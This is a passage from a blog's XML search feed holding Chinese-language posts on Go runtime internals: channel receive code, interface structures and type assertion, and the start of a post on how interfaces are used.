<span class="token punctuation">&#123;</span>     t0 <span class="token operator">=</span> <span class="token function">cputicks</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span>  <span class="token comment">// 上锁，干活</span> <span class="token function">lock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c<span class="token punctuation">.</span>lock<span class="token punctuation">)</span>  <span class="token comment">// 关了且队列里没数据了</span> <span class="token keyword">if</span> c<span class="token punctuation">.</span>closed <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> c<span class="token punctuation">.</span>qcount <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>     <span class="token function">unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c<span class="token punctuation">.</span>lock<span class="token punctuation">)</span>     <span class="token keyword">if</span> ep <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>         <span class="token function">typedmemclr</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>elemtype<span class="token punctuation">,</span> ep<span class="token punctuation">)</span>     <span class="token punctuation">&#125;</span>     <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token boolean">false</span> <span class="token punctuation">&#125;</span>  <span class="token comment">// 场景1：你想要的时候刚好有人可以给，直接交到手里就好了</span> <span class="token keyword">if</span> sg <span class="token operator">:=</span> c<span class="token punctuation">.</span>sendq<span class="token punctuation">.</span><span class="token function">dequeue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> sg <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 如果 buffer 内没有剩余的元素，直接从sender拿数据，否则，从buffer的头部拿，并将sender的值放到buffer的尾部，拿一个立马在原位置放一个，能一定程度上保证有序性。</span>     <span class="token function">recv</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> sg<span class="token punctuation">,</span> ep<span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c<span class="token punctuation">.</span>lock<span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>     <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span> <span class="token comment">// ringbuffer内还有没拿的元素</span> <span class="token keyword">if</span> c<span class="token punctuation">.</span>qcount <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>     <span class="token comment">// 从队列拿</span>     qp <span class="token operator">:=</span> <span class="token function">chanbuf</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> c<span class="token punctuation">.</span>recvx<span class="token punctuation">)</span>     <span class="token keyword">if</span> ep <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>         <span class="token function">typedmemmove</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>elemtype<span class="token punctuation">,</span> ep<span class="token punctuation">,</span> qp<span class="token punctuation">)</span>     <span class="token punctuation">&#125;</span>     <span class="token function">typedmemclr</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>elemtype<span class="token punctuation">,</span> qp<span class="token punctuation">)</span> <span class="token comment">// 加索引值</span>     c<span class="token punctuation">.</span>recvx<span class="token operator">++</span>     <span class="token keyword">if</span> c<span class="token punctuation">.</span>recvx <span class="token operator">==</span> c<span class="token punctuation">.</span>dataqsiz <span class="token punctuation">&#123;</span>         c<span class="token punctuation">.</span>recvx <span class="token operator">=</span> <span class="token number">0</span>     <span class="token punctuation">&#125;</span>     c<span class="token punctuation">.</span>qcount<span class="token operator">--</span>     <span class="token function">unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c<span class="token punctuation">.</span>lock<span class="token punctuation">)</span>     <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span> <span class="token keyword">if</span> <span class="token operator">!</span>block <span class="token punctuation">&#123;</span>     <span class="token function">unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c<span class="token punctuation">.</span>lock<span class="token punctuation">)</span>     <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token boolean">false</span> <span class="token punctuation">&#125;</span> <span class="token comment">// 没有人等着给，又没有存货，block住了</span> gp <span class="token operator">:=</span> <span class="token function">getg</span><span class="token punctuation">(</span><span class="token punctuation">)</span> mysg <span class="token operator">:=</span> <span class="token function">acquireSudog</span><span class="token punctuation">(</span><span class="token punctuation">)</span> mysg<span class="token punctuation">.</span>releasetime <span class="token operator">=</span> <span class="token number">0</span> <span class="token keyword">if</span> t0 <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>     mysg<span class="token punctuation">.</span>releasetime <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">&#125;</span> mysg<span class="token punctuation">.</span>elem <span class="token operator">=</span> ep mysg<span class="token punctuation">.</span>waitlink <span class="token operator">=</span> <span class="token boolean">nil</span> gp<span class="token punctuation">.</span>waiting <span class="token operator">=</span> mysg mysg<span class="token punctuation">.</span>g <span class="token operator">=</span> gp mysg<span class="token punctuation">.</span>isSelect <span class="token operator">=</span> <span class="token boolean">false</span> mysg<span class="token punctuation">.</span>c <span class="token operator">=</span> c gp<span class="token punctuation">.</span>param <span class="token operator">=</span> <span class="token boolean">nil</span>  <span class="token comment">// 入队等待唤醒</span> c<span class="token punctuation">.</span>recvq<span class="token punctuation">.</span><span class="token function">enqueue</span><span class="token punctuation">(</span>mysg<span class="token punctuation">)</span> atomic<span class="token punctuation">.</span><span class="token function">Store8</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>gp<span class="token punctuation">.</span>parkingOnChan<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment">// goroutine切走，让出cpu</span> <span class="token function">gopark</span><span class="token punctuation">(</span>chanparkcommit<span class="token punctuation">,</span> unsafe<span class="token punctuation">.</span><span class="token function">Pointer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c<span class="token punctuation">.</span>lock<span class="token punctuation">)</span><span class="token punctuation">,</span> waitReasonChanReceive<span class="token punctuation">,</span> traceEvGoBlockRecv<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment">// someone woke us up</span> <span class="token keyword">if</span> mysg <span class="token operator">!=</span> gp<span class="token punctuation">.</span>waiting <span class="token punctuation">&#123;</span>     <span class="token function">throw</span><span class="token punctuation">(</span><span class="token string">"G waiting list is corrupted"</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span> gp<span class="token punctuation">.</span>waiting <span class="token operator">=</span> <span class="token boolean">nil</span> gp<span class="token punctuation">.</span>activeStackChans <span class="token operator">=</span> <span class="token boolean">false</span> <span class="token keyword">if</span> mysg<span class="token punctuation">.</span>releasetime <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>     <span class="token function">blockevent</span><span class="token punctuation">(</span>mysg<span class="token punctuation">.</span>releasetime<span class="token operator">-</span>t0<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span> closed <span class="token operator">:=</span> gp<span class="token punctuation">.</span>param <span class="token operator">==</span> <span class="token boolean">nil</span> gp<span class="token punctuation">.</span>param <span class="token operator">=</span> <span class="token boolean">nil</span> mysg<span class="token punctuation">.</span>c <span class="token operator">=</span> <span class="token boolean">nil</span> <span class="token function">releaseSudog</span><span class="token punctuation">(</span>mysg<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token operator">!</span>closed<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><p>可以看到send和recv代码和处理情况基本一样：</p><ol><li>如果是非阻塞模式（ block&#x3D;false ），并且没有任何可用元素，返回 （selected&#x3D;false，received&#x3D;false），这样就不会进到 select 的 case 分支；</li><li>如果是阻塞模式（ block&#x3D;true ），如果 chan 已经 closed 了，那么返回的是 （selected&#x3D;true，received&#x3D;false），说明需要进到 select 的分支，但是是没有取到元素的；</li><li>如果是阻塞模式，chan 还是正常状态，那么返回（selected&#x3D;true，recived&#x3D;true），说明正常取到了元素；<br>select部分和send基本一致，在编译时block参数设为false，不再重复。不过recv还可以通过range的方式进行。</li></ol><ul><li>for循环<br><code>for-range</code> 和 chan 的结束条件只有这个 chan 被 close 了，否则一直会处于这个死循环内部，因为block参数为true。<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">for</span> m <span class="token operator">:=</span> <span class="token keyword">range</span> c <span class="token punctuation">&#123;</span>  <span class="token comment">// ...   do something</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">chanrecv2</span><span class="token punctuation">(</span>c <span class="token operator">*</span>hchan<span class="token punctuation">,</span> elem unsafe<span class="token punctuation">.</span>Pointer<span class="token punctuation">)</span> <span class="token punctuation">(</span>received <span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 注意了，这个 block=true，说明 chanrecv 内部是阻塞的；</span>  <span class="token boolean">_</span><span class="token punctuation">,</span> received <span class="token operator">=</span> <span class="token function">chanrecv</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> elem<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span>          <span class="token keyword">return</span><span class="token punctuation">&#125;</span><span class="token comment">// 伪代码</span><span class="token keyword">for</span> <span class="token punctuation">(</span>   <span class="token punctuation">;</span> ok <span class="token operator">=</span> <span class="token function">chanrecv2</span><span class="token punctuation">(</span> c<span class="token punctuation">,</span> ep <span class="token punctuation">)</span>  <span class="token punctuation">;</span>   <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// do something</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://legendtkl.com/2017/08/06/golang-channel-implement/">http://legendtkl.com/2017/08/06/golang-channel-implement/</a></p><p><a href="https://zhuanlan.zhihu.com/p/297053654">https://zhuanlan.zhihu.com/p/297053654</a></p><p><a href="https://www.cyhone.com/articles/analysis-of-golang-channel/">https://www.cyhone.com/articles/analysis-of-golang-channel/</a></p>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang-Map底层是怎么实现的?</title>
      <link href="/Code/Code-Golang-map/"/>
      <url>/Code/Code-Golang-map/</url>
      
        <content type="html"><![CDATA[<div class="note info no-icon">      <a class="no-line-link" href="../../scode">本文分类《源码计划》</a></div>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang-Slice底层是怎么实现的?</title>
      <link href="/Code/Code-Golang-slice/"/>
      <url>/Code/Code-Golang-slice/</url>
      
        <content type="html"><![CDATA[<div class="note info no-icon">      <a class="no-line-link" href="../../scode">本文分类《源码计划》</a></div>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang-String底层是怎么实现的?</title>
      <link href="/Code/Code-Golang-string/"/>
      <url>/Code/Code-Golang-string/</url>
      
        <content type="html"><![CDATA[<div class="note info no-icon">      <a class="no-line-link" href="../../scode">本文分类《源码计划》</a></div>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang-Interface底层是怎么实现的?</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-07-16-Golang-Interface%E5%BA%95%E5%B1%82%E6%98%AF%E6%80%8E%E4%B9%88%E5%AE%9E%E7%8E%B0%E7%9A%84/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-07-16-Golang-Interface%E5%BA%95%E5%B1%82%E6%98%AF%E6%80%8E%E4%B9%88%E5%AE%9E%E7%8E%B0%E7%9A%84/</url>
      
        <content type="html"><![CDATA[<h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><ul><li>从runtime包分析学习interface底层结构和interface断言的实现、</li></ul><h3 id="是nil，但不完全是nil"><a href="#是nil，但不完全是nil" class="headerlink" title="是nil，但不完全是nil"></a>是nil，但不完全是nil</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">InterfaceTest</span><span class="token punctuation">(</span>v <span class="token keyword">interface</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span>    <span class="token keyword">if</span> v <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"v is nil"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token punctuation">&#125;</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"v is not nil"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">InterfaceTest2</span><span class="token punctuation">(</span>v <span class="token operator">*</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span>    <span class="token keyword">if</span> v <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"v is nil"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token punctuation">&#125;</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"v is not nil"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> v <span class="token operator">*</span><span class="token builtin">int</span> <span class="token operator">=</span> <span class="token boolean">nil</span>    <span class="token function">InterfaceTest</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>    <span class="token function">InterfaceTest2</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行main方法，查看输出结果发现：InterfaceTest2是符合预期的。从InterfaceTest的输出来看，v是nil，但不完全为nil，经过interface转换之后发生了什么？</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token operator">&lt;</span><span class="token boolean">nil</span><span class="token operator">></span>v is not <span class="token boolean">nil</span><span class="token operator">&lt;</span><span class="token boolean">nil</span><span class="token operator">></span>v is <span class="token boolean">nil</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="interface底层结构"><a href="#interface底层结构" class="headerlink" title="interface底层结构"></a>interface底层结构</h3><p>interface判断与预期不一样的根本原因，interface根本不是那么简简单单，而是两个struct。什么？interface不是单纯的值？是struct，还是两个？</p><p><img src="https://i.loli.net/2021/07/16/zLr4R9OBxoVdsGw.jpg"></p><p>根据interface是否包含method，底层实现上有两种struct：eface，iface</p><ul><li><p>eface表示不包含任何方法的空接口，也称为 empty interface。</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">type</span> eface <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>  _type <span class="token operator">*</span>_type <span class="token comment">// 指向类型信息</span>  data  unsafe<span class="token punctuation">.</span>Pointer <span class="token comment">// 指向值信息</span><span class="token punctuation">&#125;</span><span class="token keyword">type</span> _type <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>  size       <span class="token builtin">uintptr</span> <span class="token comment">// 类型的大小</span>  ptrdata    <span class="token builtin">uintptr</span> <span class="token comment">// 所有指针的内存前缀大小</span>  hash       <span class="token builtin">uint32</span>  <span class="token comment">// 类型的hash值。此处提前计算好，可以避免在哈希表中计算</span>  tflag      tflag   <span class="token comment">// 额外的类型信息标志。此处为类型的 flag 标志，主要用于反射</span>  align      <span class="token builtin">uint8</span>   <span class="token comment">// 对应变量与该类型的内存对齐大小。</span>  fieldalign <span class="token builtin">uint8</span>   <span class="token comment">// 对应类型的结构体的内存对齐大小。</span>  kind       <span class="token builtin">uint8</span>   <span class="token comment">// 类型的枚举值。包含 Go 语言中的所有类型，例如：kindBool、kindInt、kindInt8、kindInt16 等。</span>  alg        <span class="token operator">*</span>typeAlg  <span class="token comment">// algorithm table</span>  gcdata    <span class="token operator">*</span><span class="token builtin">byte</span>    <span class="token comment">// 存储垃圾收集器的 GC 类型数据</span>  str       nameOff  <span class="token comment">// string form</span>  ptrToThis typeOff  <span class="token comment">// type for pointer to this type, may be zero</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>iface包含一些method的具体实现，存在itab.fun变量里</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">type</span> iface <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>  tab  <span class="token operator">*</span>itab  data unsafe<span class="token punctuation">.</span>Pointer<span class="token punctuation">&#125;</span><span class="token keyword">type</span> itab <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>  inter  <span class="token operator">*</span>interfacetype <span class="token comment">// 接口的类型信息</span>  _type  <span class="token operator">*</span>_type <span class="token comment">// 具体类型信息，这个type和eface里的type是一个东西</span>  link   <span class="token operator">*</span>itab  bad    <span class="token builtin">int32</span>  inhash <span class="token builtin">int32</span>      <span class="token comment">// has this itab been added to hash?</span>  fun    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token builtin">uintptr</span> <span class="token comment">// 底层数组，存储接口的方法集的具体实现的地址，其包含一组函数指针，实现了接口方法的动态分派，且每次在接口发生变更时都会更新</span><span class="token punctuation">&#125;</span><span class="token keyword">type</span> interfacetype <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span> typ     _type pkgpath name mhdr    <span class="token punctuation">[</span><span class="token punctuation">]</span>imethod<span class="token punctuation">&#125;</span><span class="token keyword">type</span> imethod <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span> name nameOff ityp typeOff<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="类型断言是怎么实现的？"><a href="#类型断言是怎么实现的？" class="headerlink" title="类型断言是怎么实现的？"></a>类型断言是怎么实现的？</h3><ul><li>断言分为安全和非安全两种<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">myAssert</span><span class="token punctuation">(</span>v <span class="token keyword">interface</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// 进行变量断言，若不判断容易出现 panic</span>  s <span class="token operator">:=</span> v<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span>  <span class="token comment">// 进行安全断言</span>s<span class="token punctuation">,</span> ok <span class="token operator">:=</span> v<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">myAssert</span><span class="token punctuation">(</span>v <span class="token keyword">interface</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// 进行 switch 断言</span><span class="token keyword">switch</span> v<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token keyword">type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">case</span> <span class="token builtin">string</span><span class="token punctuation">:</span>    <span class="token comment">// do something</span><span class="token keyword">case</span> <span class="token builtin">int</span><span class="token punctuation">:</span>    <span class="token comment">// do something</span><span class="token keyword">case</span> <span class="token builtin">float64</span><span class="token punctuation">:</span>    <span class="token comment">// do something</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>iface和eface对应不同的方法，安全和不安全也对应两种方法。(runtime包iface.go)<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">assertI2I</span><span class="token punctuation">(</span>inter <span class="token operator">*</span>interfacetype<span class="token punctuation">,</span> i iface<span class="token punctuation">)</span> <span class="token punctuation">(</span>r iface<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  tab <span class="token operator">:=</span> i<span class="token punctuation">.</span>tab  <span class="token keyword">if</span> tab <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// explicit conversions require non-nil interface value.</span>      <span class="token function">panic</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>TypeAssertionError<span class="token punctuation">&#123;</span><span class="token boolean">nil</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>inter<span class="token punctuation">.</span>typ<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> tab<span class="token punctuation">.</span>inter <span class="token operator">==</span> inter <span class="token punctuation">&#123;</span>      r<span class="token punctuation">.</span>tab <span class="token operator">=</span> tab      r<span class="token punctuation">.</span>data <span class="token operator">=</span> i<span class="token punctuation">.</span>data      <span class="token keyword">return</span>  <span class="token punctuation">&#125;</span>  r<span class="token punctuation">.</span>tab <span class="token operator">=</span> <span class="token function">getitab</span><span class="token punctuation">(</span>inter<span class="token punctuation">,</span> tab<span class="token punctuation">.</span>_type<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span>  r<span class="token punctuation">.</span>data <span class="token operator">=</span> i<span class="token punctuation">.</span>data  <span class="token keyword">return</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">assertI2I</span><span class="token punctuation">(</span>inter <span class="token operator">*</span>interfacetype<span class="token punctuation">,</span> i iface<span class="token punctuation">)</span> <span class="token punctuation">(</span>r iface<span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">assertE2I2</span><span class="token punctuation">(</span>inter <span class="token operator">*</span>interfacetype<span class="token punctuation">,</span> e eface<span class="token punctuation">)</span> <span class="token punctuation">(</span>r iface<span class="token punctuation">,</span> b <span class="token builtin">bool</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">assertE2I</span><span class="token punctuation">(</span>inter <span class="token operator">*</span>interfacetype<span class="token punctuation">,</span> e eface<span class="token punctuation">)</span> <span class="token punctuation">(</span>r iface<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="http://legendtkl.com/2017/07/01/golang-interface-implement/">http://legendtkl.com/2017/07/01/golang-interface-implement/</a></p><p><a href="https://mp.weixin.qq.com/s/vNACbdSDxC9S0LOAr7ngLQ">https://mp.weixin.qq.com/s/vNACbdSDxC9S0LOAr7ngLQ</a></p>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang-Interface能怎么用?</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-07-16-Golang-Interface%E8%83%BD%E6%80%8E%E4%B9%88%E7%94%A8/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-07-16-Golang-Interface%E8%83%BD%E6%80%8E%E4%B9%88%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="Golang-Interface-应用"><a href="#Golang-Interface-应用" class="headerlink" title="Golang Interface 应用"></a>Golang Interface 应用</h2><h3 id="Interface是什么？"><a href="#Interface是什么？" class="headerlink" title="Interface是什么？"></a>Interface是什么？</h3><p>在Golang中，interface是一组method的集合，duck-type programing的一种体现。不关心属性（数据），只关心行为（方法）。可以认为interface是一种协议，一种为了双方交流而做出的约定。</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// The error built-in interface type is the conventional interface for</span><span class="token comment">// representing an error condition, with the nil value representing no error.</span><span class="token keyword">type</span> <span class="token builtin">error</span> <span class="token keyword">interface</span> <span class="token punctuation">&#123;</span>    <span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">string</span><span class="token punctuation">&#125;</span><span class="token comment">// ----------------</span><span class="token comment">// 定义自己的err类型</span><span class="token keyword">type</span> MyErr <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">// 实现error接口</span><span class="token keyword">func</span> <span class="token punctuation">(</span>e <span class="token operator">*</span>MyErr<span class="token punctuation">)</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token string">"my error"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Interface能干什么？"><a href="#Interface能干什么？" class="headerlink" title="Interface能干什么？"></a>Interface能干什么？</h3><ul><li>writing generic algorithm （泛型编程）</li><li>hiding implementation detail （隐藏具体实现）</li><li>providing interception points （提供拦截点）</li></ul><h4 id="writing-generic-algorithm"><a href="#writing-generic-algorithm" class="headerlink" title="writing generic algorithm"></a>writing generic algorithm</h4><p>golang的泛型最早1.17才提供版本支持。用interface实现一下行不行呀？</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> sort<span class="token keyword">type</span> Interface <span class="token keyword">interface</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Len is the number of elements in the collection.</span>    <span class="token function">Len</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">int</span>    <span class="token comment">// Less reports whether the element with</span>    <span class="token comment">// index i should sort before the element with index j.</span>    <span class="token function">Less</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token builtin">bool</span>    <span class="token comment">// Swap swaps the elements with indexes i and j.</span>    <span class="token function">Swap</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token comment">// ------------------</span><span class="token keyword">type</span> BestLanguage <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    Name  <span class="token builtin">string</span>    Score <span class="token builtin">int</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>b BestLanguage<span class="token punctuation">)</span> <span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> fmt<span class="token 